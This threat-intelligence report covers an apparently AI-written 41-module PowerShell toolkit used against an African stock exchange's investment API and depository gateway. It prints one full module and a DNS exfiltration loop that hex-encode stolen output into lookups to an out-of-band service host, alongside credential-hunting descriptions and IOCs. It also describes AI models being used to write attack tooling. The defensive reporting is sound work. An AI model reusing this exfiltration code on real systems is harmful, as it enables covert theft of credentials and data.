---
title: Major African Stock Exchange Targeted in AI-Assisted Attack
author: Thibaut Passilly Threat Hunter; Enterprise Security Group; Broadcom
url: https://www.security.com/threat-intelligence/african-stock-exchange-ai-assisted-attack
hostname: security.com
description: A 41-module PowerShell toolkit with all the hallmarks of AI authorship tested credentials and API keys against the exchange's investment API and a securities depository gateway.
sitename: SECURITY.COM
date: "2026-11-19"
fingerprint: "9e111dca58b04cc8"
language: en
image: https://www.security.com/sites/default/files/styles/blogs_hero_tiny/public/2026-11/Hero%20Image_1.jpg.webp?h=d0633ac3&itok=my9yR8FY
pagetype: article
filedate: "2026-11-25"
---
# Major African Stock Exchange Targeted in AI-Assisted Attack

## A 41-module PowerShell toolkit with all the hallmarks of AI authorship tested credentials and API keys against the exchange's investment API and a securities depository gateway.

## Key findings

- Symantec's Threat Hunter Team found a toolkit on a stock exchange in an African country with multiple traits that suggest it was written, or at least assisted, by an AI model.
- 41 PowerShell modules ran under a web shell for just over three minutes on September 20, 2026, with a new module starting every few seconds. The modules hunted for credentials and secrets and tested them against the exchange’s financial systems.
- Each module sent its output as hex-encoded DNS lookups to a unique subdomain of a public out-of-band testing service, a rarely seen technique.
- Six persistence implants on the same server are attributed to the China-linked espionage group Witchetty with high confidence, but we have not attributed the AI-authored toolkit to any group.
- The earliest evidence of malicious activity dated from April 2026, although the attackers may have been present for longer.
- This attack is another example of the recent trend of attacks on financial organizations, such as the [multi-billion-dollar Binance cryptocurrency hack](https://www.bbc.com/news/articles/ck5ynwz9gy67o), and [a $110 million cyber heist](https://www.reuters.com/legal/government/french-bank-credit-mutuel-arkea-says-100-million-missing-after-cyberattack-2026-11-05/) on French bank Crédit Mutuel Arkéa .

## Overview

Attackers used a likely AI-authored toolkit to hunt for credentials at an African stock exchange and test them against systems close to its financial operations. At one point during the breach, 41 PowerShell modules ran under a webshell on an Internet Information Services (IIS) server in three minutes and twelve seconds, with a new module starting every few seconds. The modules tested credentials, a reused bearer token and API keys against the exchange's own investment API and the gateway of a securities depository.

The toolkit is one of the clearest examples of suspected machine-written attack tooling that we have seen to date. Every module shared the same scaffold, and a Domain Name System (DNS) exfiltration loop was copied byte for byte into all 41 scripts, where a programmer would normally write it once as a shared function. Each module sent its output as hex-encoded DNS lookups to a public out-of-band testing service, a rarely seen technique. The results went to a collector that we cannot see, so we do not know whether any of the credentials or keys worked.

The earliest evidence of malicious activity on the server dated from April 2026, but the attackers may have been present for longer. Six persistence implants were installed on the server. We attribute the implants to the China-linked espionage group Witchetty (aka LookingFrog) with high confidence, but we have not attributed the activity described below to any group. It could be Witchetty using new tooling, a second and more capable operator using the same access, or an unrelated actor who has compromised the same server. It’s hard to say which of these explanations is most likely, but this is a far more advanced toolkit than those previously attributed to Witchetty.

## Targeting and motivation

The toolkit searched the domain's shared policy folders and the application directories of six business applications for secrets, including cloud keys and database connection strings. They also mapped cloud and database infrastructure, enumerated SharePoint, System Center Configuration Manager (SCCM) and Team Foundation Server (TFS) servers, and tested access to the exchange's own investment application programming interface (API) and to the gateway of a securities depository.

The investment API and the depository gateway sit close to the exchange's financial operations, which would make credentials for them valuable to a range of actors. We did not see the results of this activity, so we cannot say exactly what the attackers wanted or whether any of the credentials or keys worked.

As a result, it is hard to definitively say what the motivation driving the attack was. The target suggests the attack was financially motivated. However, Witchetty is traditionally known as an espionage group, though it is not unheard of for Chinese espionage actors to also dabble in cybercrime activity. Attempts by the attackers to access the investment API, and the testing of API keys against banking gateway software, would support the narrative that this activity was financially motivated.

However, the attackers did also check a specific investor’s number, which indicates they may have been interested in stealing the investment plans of someone specific, meaning an espionage motive cannot be ruled out. The stealing of source code, internal infrastructure and employee data could also support this hypothesis, while the stealthy manner in which the attackers exfiltrated data also underlined that they wanted this activity to remain undetected.

## Tooling and tradecraft

### A toolkit built from single-purpose modules

The toolkit ran between 08:44 and 08:47 UTC, a window of three minutes and twelve seconds, but did a lot in that constrained timeframe. Individual modules stole Group Policy Preferences (GPP) passwords, searched for AWS keys and database connection strings in shared folders and application directories, checked the host for cloud credentials, and opened a connection to a database cluster hosted on Amazon Web Services (AWS). Others enumerated SharePoint sites and searched their content for keywords, queried SCCM and TFS servers, and mapped the IIS sites and application pools on the server.

Four modules targeted the exchange's investment API. They sent a login request using a username and a guessed password, reused a bearer token, and tested several API keys against the depository gateway, including a blank key that may have served as a control. These modules connected to the API host by IP address and set the Host header manually. They also disabled certificate validation.

### What the commands revealed

The commands used to run the modules give us an indication of what the attackers targeting this organization were interested in. In the modules’ commands, data is exfiltrated to a DNS server, and there's a sub-domain that changes according to what the command does – such as ‘spid1’ for Host and Process Enumeration and ‘awslocal1’ for Cloud and Devops Hunting, and so on. The functionalities of the modules included:

- **Host and Process Enumeration (spid1, proc2, proc3, smbctx1, smbsc1):** Collects the machine name, current user identity, mapped network drives, SMB connections, and running process trees (including parent processes and full command-line arguments via WMI).
- **Cloud and DevOps Hunting (awslocal1):** Searches for AWS CLI configurations, environment variables related to databases or secrets, and active processes for tools like Docker, Kubernetes, Terraform, Jenkins, and GitLab.
- **Web Server (IIS) Profiling (iis1, iisa1, iisp2):** Interrogates IIS using the WebAdministration module to map out local websites, application pools, physical disk paths, bindings, and pool identity users.
- **Secret and Credential Scraping (cfg1, sites1, xpjs1, dep1, sysm1, sysh1, sysv2, gpp1, awsa1):** Recursively scans local web roots, deployment directories (C:\Deployer), and the domain's SYSVOL network share. It specifically targets configuration files (.xml, .json, .env, web.config) looking for hardcoded passwords, Group Policy cpassword fields, AWS access keys, and database connection strings.
- **Database Probing (rdsnet1, scq1):** Attempts direct TCP connections to an AWS RDS PostgreSQL instance on port 5432 and uses integrated Windows authentication to query a Microsoft SQL Server for system user and version data.
- **SharePoint and Source Code Enumeration (spf1, spl1, spd1, spd2, sps1, tfs1, tfs2):** Loads the SharePoint PowerShell snap-in to iterate through all sites and document libraries, searching for files containing sensitive keywords like “aws”, “credential”, or “password”. It also queries Team Foundation Server (TFS) APIs for project lists.
- **API Exploitation and Lateral Movement (api1, api2, map1, dbg1, adm1, admt1, adm2, keys1, key4, xtok1, cscs1, ipo1):** Probes an internal API for debugging endpoints. It then attempts to authenticate to an admin endpoint using hardcoded credentials to extract JWT tokens. Finally, it uses extracted tokens and API keys to query authenticated endpoints for user profiles and banking data.
- **SCCM Reconnaissance and Lateral-movement Targeting (cas1, wmi1, scq1, smbsc1):** Queries the SCCM AdminService and WMI (SMS\_R\_System) to find which machine a given user, likely admin, last logged on to, and enumerates the SCCM server's shares.
- **Harvested-credential Validation (keys1, key4, xtok1):** Cycles through several harvested x-api-key values and a bearer token against the same endpoints to see which one works.
- **Capital-markets Data Access (cscs1, ipo1):** Queries critical endpoints for investor and market data

### Signs of AI authorship

The case for AI authorship rests on how uniform the modules are. Each one opened with the same error-handling line, used the same outer try/catch, hex-encoded its output the same way and returned the same empty-output sentinel. The DNS exfiltration loop was copied byte for byte into all 41 modules. A programmer building a toolkit would normally write that function once, while a model asked for a standalone script each time has no reason to.

Variable names were generic, and error handling was uniformly verbose. One module contained a progress variable that no other module had, as if a model had improved a single script in isolation during iterative prompting. Another submitted an invalid credential as a deliberate test. The pace was also consistent with automated tooling, with a new module starting every few seconds. The level of detail included in the commands is another tell-tale sign that AI was used:

`$ErrorActionPreference = 'SilentlyContinue' try { $a = [string]((& { $j=Start-Job -ScriptBlock {try{Get-WmiObject -ComputerName '<redacted>-SCCM.<redacted>.com' -Namespace 'root\sms\site_<redacted>' -Class SMS_R_System -Filter "LastLogonUserName='<redacted>'" -Property Name,LastLogonUserName,ResourceId -ErrorAction Stop|ForEach-Object{'NAME='+$_.Name+';USER='+$_.LastLogonUserName+';RID='+$_.ResourceId}}catch{'WMIERR='+$_.Exception.GetBaseException().Message}} if(Wait-Job $j -Timeout 18){Receive-Job $j}else{Stop-Job $j;'WMIERR=TIMEOUT'};Remove-Job $j -Force } | Out-String).Trim()) } catch { $a = 'ERR:' + $_.Exception.Message } $b = -join ([Text.Encoding]::UTF8.GetBytes($a) | ForEach-Object { $_.ToString('x2') }) if ($b.Length -eq 0) { $b = '454d505459' } for ($i = 0; $i -lt $b.Length; $i += 50) { $n = [Math]::Min(50, $b.Length - $i) $v = $b.Substring($i, $n) try { [Net.Dns]::GetHostAddresses("$i.$v.wmi1.danoam334iqjo0ap2scg6ofosjxfgqhsa.oast.pro") | Out-Null } catch {} }`

None of these signals is conclusive on its own, but taken together they fit AI-assisted or AI-generated authorship better than they fit bespoke attacker tooling. We could not identify which model may have been used.

### DNS exfiltration through a testing service

Each module hex-encoded its output, split it into 50 hex character chunks and resolved a DNS name for each chunk. The names were unique subdomains of a single token under oast\[.\]pro, a public out-of-band testing service. The output would have left the server as DNS lookups rather than as web requests, and it would have been collected by whoever controlled the token. This is the exfiltration loop as it appeared in the modules:

`$b = -join ([Text.Encoding]::UTF8.GetBytes($a) | ForEach-Object { $_.ToString('x2') }) if ($b.Length -eq 0) { $b = '454d505459' } for ($i = 0; $i -lt $b.Length; $i += 50) {   $n = [Math]::Min(50, $b.Length - $i)   $v = $b.Substring($i, $n)   try { [Net.Dns]::GetHostAddresses("$i.$v.<module>.<token>.oast[.]pro") | Out-Null } catch {} }`

This is an unusual technique and may have been an additional attempt by the actors involved in this activity to stay under the radar and avoid detection.

## Witchetty and the attribution question

Witchetty was [first documented by ESET in April 2022](https://www.welivesecurity.com/2022/04/27/lookback-ta410-umbrella-cyberespionage-ttps-activity/) as one of three sub-groups of TA410, a cyberespionage operation with some links to the Cicada (aka APT10) group. In [September 2022, we reported](https://www.security.com/threat-intelligence/witchetty-steganography-espionage) on Witchetty attacks carried out between February and September of that year against two governments in the Middle East and this same African stock exchange. In those attacks the group exploited the ProxyShell and ProxyLogon vulnerabilities in public-facing Microsoft Exchange servers to install web shells, and it used a backdoor that hid its payload in an image.

Six persistence implants were present on the server in April 2026, and one of the Witchetty implants was first seen in 2020. The toolkit was different. It was modular and focused on cloud secrets and financial APIs, and it ran from a web shell under the IIS worker process, which suggests that a vulnerability may have been exploited to gain access. Web shells on public-facing servers featured in the 2022 Witchetty attacks, but the focus on cloud secrets and financial APIs differs from the Witchetty activity we have seen in earlier cases. For that reason, we treat the implants and the toolkit separately.

Three explanations fit the evidence. Witchetty may have returned with new tooling. A second and more capable operator may have used the access that Witchetty established. Or an unrelated actor may have used the same compromise. We could not rule out any of them.

## Significance

The toolkit is notable for how it was produced as much as for what it did. If the modules were generated by a model, an operator could produce 41 purpose-built scripts for one target without writing the shared plumbing by hand, and run them in a little over three minutes. The uniformity that points to AI authorship also gives defenders something to look for, since the same scaffold and exfiltration loop appeared in every module.

The targets of the credential tests were the exchange's own investment API and a securities depository gateway. We found no evidence of privilege escalation or data theft, and the results of the modules went to a collector that we cannot see. Whether any credentials or keys worked, and what the attackers intended to do with them, remains unknown. However, the targeting of a financial institution like a stock exchange is in itself significant and does seem to follow with the ongoing trend of attackers focusing on financial organizations, while now also using AI to carry out these attacks.

## Protection

For the latest protection updates, please visit the [Symantec Protection Bulletin](https://www.broadcom.com/support/security-center/protection-bulletin).

If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file.

## Indicators of Compromise

### File indicators

8940de2ada979ad2c53ece0b5cb84100c4df0a024b4b363e96cb6a67469e30d5 - Mimikatz

5c4f6e21877dfd71e3e95254c6193457e9aab10aca7459ddaeb6d711997190de - Loader

982750f4f9edd2ef51b9972a1018a8777bd9d65e0d2e43977a522bdc73ddef5f – Persistence implant that hijacks the Avast wsc\_proxy component

1363534d205ad60f6700d81f2af2c0ce6d959b73fd405adbb598072395bd26e5 – Persistence implant (ShellcodeLoader)

0ad7e39ce6b9b7637a002c352637089f6ccf8ae39206a7d895266b21ca26ff0f – RC4-encrypted loader

2e223e3c6dc7a130f0281a6c608cd58c153ec026c020c8a661b60a1e285140bf – Utility that base64-encodes beacon.bin, XORs it with 0x53 and writes Default.xml

5a2f093f7ae25c5e381647549496acf375e18dd95263b921518e340ee78e5377 – DLL loader that runs only inside svchost, decrypts WindowsUpdate.xml with XOR 0x53 and maps the payload in memory

b1155f47910f032217352c3a302c01de4d15cabda34331d2866f5d7a52b3ecde – Similar loader, host process svchost.exe

b737eae170534f5965b90f4af807cb3f728498f3bccc9355a0afc0171e413230 – Similar loader, host process svchost.exe

5fd9a352d1bec4a11134ee140aa278d07d720b45493a7f01a548293f412972ce – Similar loader, host process svchost.exe

242c411cd415d55e67aae75759e5c07720fcdddc0378b5e35d4c1e4ab2b01eb8 – Similar loader, host process svchost.exe

af3737ba032b8c5d3403064899ab6cc48610a397d9f67b626f99b2f0f5082202 – Similar loader, host process VSPerfCmd.exe

6b3061d6e042744bb484b725031e7916b31ad224318a8c0441b9ead14ab853d5 – DLL loader that decrypts setting.dat with a repeating 16-byte XOR key and maps it in memory

9b4dadaa55479727f7c0034ff9c07165597b9a9a9376b6e564634eeaf1c6b876 – DLL loader that decrypts setting.dat with a repeating 16-byte XOR key and maps it in memory

d732660db5af253aacbc580d6114d59d233c48b3a5ead6dcfcb55246252abed2 – DLL loader that decrypts setting.dat with a repeating 16-byte XOR key and maps it in memory

85e75e78a545d2fe11ac19385cc8c0789e1056a2cd4edfec32a6a6b113001e5a – Loader that decodes mfeann.log and injects it as x64 shellcode

1c1704d789332c4d6ce57139d27194ac64c27bfbb1368f1006ffc3c96f3bcb80 – Nim-compiled DLL impersonating VSPMsg.dll, loader for Msg.log

3ca9d65046420592e726776bb26b08719721d108f6947fd22af1d5e7cac33edc – Cobalt Strike beacon

30dc80cb4c791d80eb21597232fb2f5a4111bf3dfad32c736b789d77127310ef – Cobalt Strike beacon

152c125eacdacc69406b120afd95994eef0f7a0cd638c2d8723e64f79344a336 – Cobalt Strike beacon

8129e103509f00f40a6a2740b76bc3f9449ac09cd9222ba289e52e86f31f616e – Cobalt Strike beacon

26dc22c99e5e88363818e56dc5883258f048e426c9aa515887bf5d06872782f9 – Not available for analysis

53ddb6c51aca4bd6b00ed83a8019ee1440351f8eeb95a7b6c74a2b75210d85b2 – Not available for analysis

af295b5081ccdfd601a0aaecaa81fe1aa92125b548063863dbca2011cef658ce – Not available for analysis

0f2c40d31887418de304ca182afb4f4fecfe95937068f11fc798778c2ca95e3f – mfeann.exe

002ce0d28ec990aadbbc89df457189de37d8adaadc9c084b78eb7be9a9820c81 – vsperfcmd.exe


### Network IOCs

danoam334iqjo0ap2scg6ofosjxfgqhsa\[.\]oast\[.\]pro
